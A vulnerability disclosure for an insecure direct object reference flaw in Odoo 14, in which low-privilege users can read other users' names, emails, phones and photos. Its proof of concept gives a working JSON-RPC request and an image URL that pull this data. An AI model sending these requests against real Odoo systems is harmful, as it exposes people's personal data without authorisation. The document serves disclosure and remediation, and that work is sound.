# Odoo 14 - Insecure Direct Object Reference (IDOR) / Broken Access Control

## 📌 CVE ID
- Pending assignment from MITRE

## 📌 Description
A vulnerability in **Odoo 14** allows authenticated low-privilege users (with no assigned roles) to access sensitive customer and employee data.  
The endpoints `/web/dataset/call_kw/res.partner/read` and `/web/image` do not enforce proper access control, resulting in unauthorized disclosure of Personally Identifiable Information (PII).

---

## 🎯 Affected Versions
- Odoo 14 (Community & Enterprise)  
- Other versions (15, 16, 17) not tested yet.  

---

## 🛠 Vulnerability Type
- Insecure Direct Object Reference (IDOR)  
- Broken Access Control  
- Sensitive Information Disclosure  

---

## ⚠️ Impact
- Unauthorized exposure of customer and employee data:
  - Full names  
  - Emails  
  - Phone numbers  
  - Job titles  
  - Company addresses  
  - Profile images (Base64 encoded)  
- Potential compliance violation (GDPR, CCPA).  
- Risk of further data mining.  

**CVSS v3.1 Vector (example):**  
`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` → **Score: 7.5 (High)**  

---

## 🧪 Steps to Reproduce (PoC)

1. Login with a **basic user account** (no special roles).  
2. Intercept the following request in Burp Suite:

```http
POST /web/dataset/call_kw/res.partner/read HTTP/1.1
Host: target-odoo:8069
Content-Type: application/json
Cookie: session_id=<valid_session_id>

{
 "jsonrpc": "2.0",
 "method": "call",
 "params": {
   "args": [[39], ["id","name","email","phone","function","image_128"]],
   "model": "res.partner",
   "method": "read",
   "kwargs": {}
 },
 "id": 12345
}
```

3. Response returns details of another user:

```json
{
 "id": 39,
 "name": "Chester Reed",
 "email": "chester.reed79@example.com",
 "phone": "(979)-904-8902",
 "function": "Chief Executive Officer (CEO)",
 "image_128": "/9j/4AAQSkZJRgABAQEASABIAAD..."
}
```

4. Similarly, user images can be accessed directly:

```http
GET /web/image?model=res.users&field=image_128&id=8
```

→ Returns profile photo of another user.  

---

## 📷 Evidence
![Request 1](/evidence/Screenshot%202025-08-25%20132025.png)  
![Request 2](/evidence/Screenshot%202025-08-25%20132045.png)  
![Request 3](/evidence/Screenshot%202025-08-25%20132147.png)  
![Request 4](/evidence/Screenshot%202025-08-25%20132203.png)  
![Request 5](/evidence/Screenshot%202025-08-25%20132300.png)  
![Request 6](/evidence/Screenshot%202025-08-25%20132432.png)  
![Request 7](/evidence/Screenshot%202025-08-25%20132456.png)  

---

## 🔒 Mitigation
- Enforce record rules on `res.partner` and `res.users` models.  
- Add access control checks before returning PII.  
- Restrict `/web/image` to authorized users only.  
- Ensure ORM respects ACL/Record Rules for all JSON-RPC endpoints.  

---

## 📅 Disclosure Timeline
- 2025-06-25: Vulnerability discovered on Odoo 14 demo.  
- 2025-08-25: Requesting CVE from MITRE.  

---

## 👤 Credits
- Researcher: **Abdulaziz Alanazi - Fahad Alamri - Resilience**
